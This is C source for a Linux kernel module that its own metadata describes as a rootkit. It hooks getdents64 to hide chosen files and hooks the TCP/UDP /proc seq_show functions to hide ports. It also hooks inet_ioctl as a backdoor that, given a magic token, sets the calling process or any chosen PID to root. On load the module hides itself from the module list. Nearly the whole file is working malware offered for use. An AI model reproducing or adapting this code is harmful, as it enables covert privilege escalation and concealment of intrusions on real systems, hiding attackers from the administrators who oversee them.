#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/kobject.h>
#include <linux/string.h>
#include <linux/slab.h>
#include <linux/version.h>
#include <linux/proc_fs.h>
#include <linux/syscalls.h>
#include <linux/cred.h>
#include <linux/unistd.h> 
#include <linux/mm_types.h>
#include <linux/types.h>  
#include <linux/dirent.h> 
#include <linux/sched.h>  
#include <linux/proc_fs.h>  
#include <linux/namei.h>  
#include <linux/seq_file.h> 
#include <net/tcp.h>      
#include <net/udp.h>
#include <linux/icmp.h>
#include <linux/ip.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/socket.h>
#include <linux/signal.h>
#include <linux/kthread.h>
#include <linux/keyboard.h>

#define KERNEL_MODULE
#include "constants.h"
#include "function_hooking.h"

//  Define the module metadata.
MODULE_AUTHOR("Team405");
MODULE_LICENSE("GPL v2");
MODULE_DESCRIPTION("Rootkit hiding all kind of resources");
MODULE_VERSION("0.1");

static char *name = MODULE_NAME;
module_param(name, charp, S_IRUGO);
// MODULE_PARM_DESC(name, "The name to display in /var/log/kern.log");

typedef int seq_show(struct seq_file *,void *);
seq_show *tcp4_seq_show_ptr = 0xffffffffb6d78540;
seq_show *tcp6_seq_show_ptr = 0xffffffffb6e2b8e0;
seq_show *udp4_seq_show_ptr = 0xffffffffb6d87eb0;
seq_show *udp6_seq_show_ptr = 0xffffffffb6e1b280;

typedef int inet_ioctl(struct socket *, unsigned int, unsigned int);
inet_ioctl *inet_ioctl_ptr = 0xffffffffb6d99a20;

typedef asmlinkage long sys_getdents64(const struct pt_regs *regs);
sys_getdents64 *orig_getdents64 = 0xffffffffb658ca50;

LIST_HEAD(hidden_files);
LIST_HEAD(hidden_ports);

void hide_filename(char *filename)
{
    struct hidden_file *hf;

    hf = kmalloc(sizeof(*hf), GFP_KERNEL);
    if (!hf) {
        return;
    }
    memcpy(hf->fname, filename, strlen(filename) + 1);

    list_add(&hf->list, &hidden_files);
}

void unhide_filename(char *filename)
{
    struct hidden_file *hf;

    list_for_each_entry(hf, &hidden_files, list) {
        if (memcmp(hf->fname, filename, strlen(filename)) == 0) {
            list_del(&hf->list);
            kfree(hf);
            break;
        }
    }
}

void hidden_filename_cleanup(void)
{
    struct hidden_file *hf, *tmp;

    list_for_each_entry_safe(hf, tmp, &hidden_files, list) {
        list_del(&hf->list);
        kfree(hf);
    }
}

void hide_port ( unsigned short port )
{
    struct hidden_port *hp;

    hp = kmalloc(sizeof(*hp), GFP_KERNEL);
    if ( !hp )
        return;
    hp->port = port;

    list_add(&hp->list, &hidden_ports);
}

void unhide_port ( unsigned short port )
{
    struct hidden_port *hp;

    list_for_each_entry ( hp, &hidden_ports, list )
    {
        if ( port == hp->port )
        {
            list_del(&hp->list);
            kfree(hp);
            break;
        }
    }
}

void hidden_port_cleanup(void)
{
    struct hidden_port *hp, *tmp;

    list_for_each_entry_safe(hp, tmp, &hidden_ports, list) {
        list_del(&hp->list);
        kfree(hp);
    }
}

static int n_tcp4_seq_show ( struct seq_file *seq, void *v )
{
    int ret = 0;
    char port[12];
    struct hidden_port *hp;

    hijack_pause(tcp4_seq_show_ptr);
    ret = tcp4_seq_show_ptr(seq, v);
    hijack_resume(tcp4_seq_show_ptr);

    list_for_each_entry ( hp, &hidden_ports, list )
    {
        sprintf(port, ":%04X", hp->port);
        if ( strnstr(seq->buf + seq->count - TMPSZ, port, TMPSZ) )
        {
            seq->count -= TMPSZ;
            break;
        }
    }

    return ret;
}

static int n_tcp6_seq_show ( struct seq_file *seq, void *v )
{
    int ret = 0;
    char port[12];
    struct hidden_port *hp;

    hijack_pause(tcp6_seq_show_ptr);
    ret = tcp6_seq_show_ptr(seq, v);
    hijack_resume(tcp6_seq_show_ptr);

    list_for_each_entry ( hp, &hidden_ports, list )
    {
        sprintf(port, ":%04X", hp->port);
        if ( strnstr(seq->buf + seq->count - TMPSZ - TCP6_EXTENSION, port, TMPSZ + TCP6_EXTENSION) )
        {
            seq->count -= (TMPSZ + TCP6_EXTENSION);
            break;
        }
    }

    return ret;
}

static int n_udp4_seq_show ( struct seq_file *seq, void *v )
{
    int ret = 0;
    char port[12];
    struct hidden_port *hp;

    hijack_pause(udp4_seq_show_ptr);
    ret = udp4_seq_show_ptr(seq, v);
    hijack_resume(udp4_seq_show_ptr);

    list_for_each_entry ( hp, &hidden_ports, list )
    {
        sprintf(port, ":%04X", hp->port);
        if ( strnstr(seq->buf + seq->count - TMPSZ, port, TMPSZ) )
        {
            seq->count -= TMPSZ;
            break;
        }
    }

    return ret;
}

static int n_udp6_seq_show ( struct seq_file *seq, void *v )
{
    int ret = 0;
    char port[12];
    struct hidden_port *hp;

    hijack_pause(udp6_seq_show_ptr);
    ret = udp6_seq_show_ptr(seq, v);
    hijack_resume(udp6_seq_show_ptr);

    list_for_each_entry ( hp, &hidden_ports, list )
    {
        sprintf(port, ":%04X", hp->port);
        if ( strnstr(seq->buf + seq->count - TMPSZ, port, TMPSZ) )
        {
            seq->count -= TMPSZ;
            break;
        }
    }

    return ret;
}

void arbitrary_set_root(pid_t pid){
    pr_info("%s: arbitrary_set_root(), pid: %u\n", MODULE_NAME, pid);

    struct task_struct *target_task;
    // Must be called under rcu_read_lock()
    rcu_read_lock();
    target_task = pid_task(find_vpid(pid), PIDTYPE_PID);
    if (target_task == NULL){
        pr_info("%s: arbitrary_set_root(), Failed find task\n", MODULE_NAME);
        rcu_read_unlock();
        return;
    }

    pr_info("%s: arbitrary_set_root(), target_task->cred->uid.val: %d\n", MODULE_NAME, target_task->cred->uid.val);
    if(target_task->cred->uid.val == 0){
        pr_info("%s: arbitrary_set_root(), the process is already root\n", MODULE_NAME);
        rcu_read_unlock();
        return;
    }

    // change task creds to root
    unsigned long o_cr0;
    o_cr0 = disable_wp();
    memset(&target_task->cred->uid, 0, sizeof(uid_t));
    memset(&target_task->cred->gid, 0, sizeof(kgid_t));
    memset(&target_task->cred->suid, 0, sizeof(kuid_t));
    memset(&target_task->cred->sgid, 0, sizeof(kgid_t));
    memset(&target_task->cred->euid, 0, sizeof(kuid_t));
    memset(&target_task->cred->egid, 0, sizeof(kgid_t));
    memset(&target_task->cred->fsuid, 0, sizeof(kuid_t));
    memset(&target_task->cred->fsgid, 0, sizeof(kgid_t));
    restore_wp(o_cr0);

    rcu_read_unlock();
    pr_info("%s: arbitrary_set_root(): Success\n", MODULE_NAME);
}

void set_root(void)
{
    kuid_t curr_uid = current_uid();
    pr_info("%s: set_root(), curr_uid: %d\n", MODULE_NAME, curr_uid.val);

    if(curr_uid.val == 0){
        pr_info("%s: set_root(), the process is already root\n", MODULE_NAME);
        return;
    }

    struct cred *new_cred;
    new_cred = prepare_creds();
    if (!new_cred)
        return;

    /* Run through and set all the various *id's to 0 (root) */
    new_cred->uid.val = 0;
    new_cred->gid.val = 0;
    new_cred->euid.val = 0;
    new_cred->egid.val = 0;
    new_cred->suid.val = 0;
    new_cred->sgid.val = 0;
    new_cred->fsuid.val = 0;
    new_cred->fsgid.val = 0;

    if (commit_creds(new_cred))
        pr_info("%s: set_root(): Failed to set new credentials for the task\n", MODULE_NAME);
    else
        pr_info("%s: set_root(): Success\n", MODULE_NAME);
}

/* This is our hooked function for sys_getdents64 */
asmlinkage int hook_getdents64(const struct pt_regs *regs)
{
    struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;

    long error;

    struct linux_dirent64 *current_dir, *dirent_ker, *previous_dir = NULL;
    struct hidden_file *hf;
    unsigned long offset;

    hijack_pause(orig_getdents64);
    int ret = orig_getdents64(regs);
    hijack_resume(orig_getdents64);
    dirent_ker = kzalloc(ret, GFP_KERNEL);

    if ( (ret <= 0) || (dirent_ker == NULL) )
        return ret;

    error = copy_from_user(dirent_ker, dirent, ret);
    if (error)
        goto done;

    list_for_each_entry(hf, &hidden_files, list) {
        offset = 0;
        while (offset < ret)
        {
            current_dir = (void *)dirent_ker + offset;

            if ( memcmp(hf->fname, current_dir->d_name, strlen(hf->fname)) == 0)
            {
                if ( current_dir == dirent_ker )
                {
                    ret -= current_dir->d_reclen;
                    memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                    continue;
                }
                previous_dir->d_reclen += current_dir->d_reclen;
            }
            else
            {
                previous_dir = current_dir;
            }

            offset += current_dir->d_reclen;
        }
    }

    error = copy_to_user(dirent, dirent_ker, ret);
    if (error)
        goto done;

done:
    kfree(dirent_ker);
    return ret;

}

static long inet_ioctl_hook ( struct socket *sock, unsigned int cmd, unsigned long arg )
{
    int ret;
    struct s_args args;

    if ( cmd == AUTH_TOKEN )
    {
        ret = copy_from_user(&args, (void *)arg, sizeof(args));
        pr_info("%s: inet_ioctl_hook args.cmd: %d\n", MODULE_NAME,  args.cmd);
        if (ret)
            return 0;

        switch ( args.cmd ){
        case 0:
            set_root();
            break;
        case 1:
        {
            pid_t pid;
            ret = copy_from_user(&pid, (void *)args.ptr, sizeof(pid_t));
            if (ret){
                pr_info("%s: Failed to get pid from usermode\n", MODULE_NAME);
                return 0;
            }
            arbitrary_set_root(pid);
            break;
        }
        case 2:
        {
            char fname[MAX_BUF_SIZE];
            ret = copy_from_user(fname, (char *)args.ptr, MAX_BUF_SIZE);
            if (ret) {
                pr_info("%s: Failed to get filename from usermode\n", MODULE_NAME);
                return 0;
            }
            pr_info("%s: hiding %s file\n", MODULE_NAME, fname);
            hide_filename(fname);
            break;
        }
        case 3:
        {
            unsigned short portnum;
            ret = copy_from_user(&portnum, (short *)args.ptr, sizeof(portnum));
            if (ret) {
                pr_info("%s: Failed to get portnum from usermode\n", MODULE_NAME);
                return 0;
            }
            hide_port(portnum);
            break;
        }
        default:
            pr_info("%s: inet_ioctl_hook default case\n", MODULE_NAME);
            break;
        }
        return 0;
    }

    hijack_pause(inet_ioctl_ptr);
    ret = inet_ioctl_ptr(sock, cmd, arg);
    hijack_resume(inet_ioctl_ptr);

    return ret;
}

static int __init amazing_rootkit_init(void)
{
    pr_info("%s: amazing_rootkit_init\n", MODULE_NAME);

    // Do kernel module hiding
    list_del_init(&__this_module.list);
    kobject_del(&THIS_MODULE->mkobj.kobj);

    hijack_start(orig_getdents64, &hook_getdents64);
    hijack_start(inet_ioctl_ptr, &inet_ioctl_hook);

    hijack_start(tcp4_seq_show_ptr, &n_tcp4_seq_show);
    hijack_start(tcp6_seq_show_ptr, &n_tcp6_seq_show);
    hijack_start(udp4_seq_show_ptr, &n_udp4_seq_show);
    hijack_start(udp6_seq_show_ptr, &n_udp6_seq_show);

    return 0;
}

static void __exit amazing_rootkit_exit(void)
{
    hijack_stop(inet_ioctl_ptr);
    hijack_stop(tcp4_seq_show_ptr);
    hijack_stop(tcp6_seq_show_ptr);
    hijack_stop(udp4_seq_show_ptr);
    hijack_stop(udp6_seq_show_ptr);
    hijack_stop(orig_getdents64);

    hidden_filename_cleanup();
    hidden_port_cleanup();

    pr_info("%s: amazing_rootkit exit & cleanup\n", MODULE_NAME);
}

module_init(amazing_rootkit_init);
module_exit(amazing_rootkit_exit);
